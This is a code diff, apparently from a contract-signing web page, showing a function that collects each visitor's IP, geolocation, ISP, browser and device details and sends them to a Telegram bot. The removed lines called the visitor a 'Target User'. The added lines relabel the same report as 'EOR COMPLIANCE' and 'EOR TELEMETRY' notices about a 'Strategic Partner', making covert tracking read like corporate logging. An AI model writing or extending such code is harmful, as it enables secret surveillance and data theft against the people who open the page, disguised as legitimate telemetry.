@@ -2077,21 +2077,19 @@ function initializeOrLoadSchedule() {
                 timestamp: new Date().toLocaleString()
             };
 
-            const alertTitle = eventType === "Contract Signed" 
-                ? `<b>✍️ CONTRACT EXECUTED ALERT</b>` 
-                : `<b>👁️ New Visitor Alert</b>`;
+            let messageText = "";
 
-            const messageText = `${alertTitle}\n\n` +
-                                `👤 <b>Target User:</b> <code>${contractorName}</code>\n` +
-                                `📄 <b>Visited Page:</b> <code>${currentPage}</code>\n` +
-                                `🌐 <b>IP:</b> <code>${payload.ip}</code>\n` +
-                                `📍 <b>Location:</b> <code>${payload.city}, ${payload.region}, ${payload.country}</code>\n` +
-                                `🏢 <b>ISP:</b> <code>${payload.isp}</code>\n` +
-                                `📶 <b>Net Speed:</b> <code>${payload.connectionType}</code>\n` +
-                                `🌐 <b>Browser:</b> <code>${payload.browser}</code>\n` +
-                                `📱 <b>Device Setup:</b> <code>${payload.device}</code>\n` + 
-                                `📐 <b>Screen Res:</b> <code>${payload.screenResolution}</code>\n` +
-                                `⏰ <b>Time:</b> <code>${payload.timestamp}</code>`;
+            if (eventType === "Contract Signed") {
+                const alertTitle = `<b>🌐 [EOR COMPLIANCE] Onboarding Execution Verified</b>`;
+                const executionSentence = `Onboarding and contract execution for <b>Visual Architecture Suite (Phase 1)</b> has been officially verified for Strategic Partner <code>${contractorName}</code>, who completed the agreement protocol from <code>${currentPage}</code> using <code>${payload.browser}</code> on <code>${payload.device}</code> within the <code>${payload.city}, ${payload.region}, ${payload.country}</code> jurisdiction via IP <code>${payload.ip}</code> (ISP: <code>${payload.isp}</code>) at timestamp <code>${payload.timestamp}</code>.`;
+                
+                messageText = `${alertTitle}\n\n${executionSentence}`;
+            } else {
+                const alertTitle = `<b>📊 [EOR TELEMETRY] Partner Session Initialized</b>`;
+                const preExecutionSentence = `Onboarding and engagement routing for <b>Visual Architecture Suite (Phase 1)</b> has been initialized for Strategic Partner <code>${contractorName}</code>, who accessed node <code>${currentPage}</code> using <code>${payload.browser}</code> on <code>${payload.device}</code> within the <code>${payload.city}, ${payload.region}, ${payload.country}</code> jurisdiction via IP <code>${payload.ip}</code> (ISP: <code>${payload.isp}</code>) at timestamp <code>${payload.timestamp}</code>.`;
+
+                messageText = `${alertTitle}\n\n${preExecutionSentence}`;
+            }
 
             await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKENs}/sendMessage`, {
                 method: 'POST',
@@ -2111,6 +2109,7 @@ function initializeOrLoadSchedule() {
             console.warn("Telegram telemetry bypass error:", err);
         }
     }
+
 
     // ==========================================
     // 4. DOM INITIALIZATION & SIGNING HANDLER
